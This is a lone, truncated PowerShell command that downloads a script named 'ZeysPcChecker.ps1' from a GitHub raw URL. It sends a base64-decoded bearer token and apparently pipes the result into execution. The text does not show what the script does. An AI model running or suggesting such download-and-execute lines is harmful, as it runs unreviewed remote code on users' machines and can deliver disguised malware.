$t=""; iwr -useb https://raw.githubusercontent.com/zeyondma/pc-checker/main/ZeysPcChecker.ps1 -Headers @{ "Authorization" = "Bearer $([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($t)))" ex
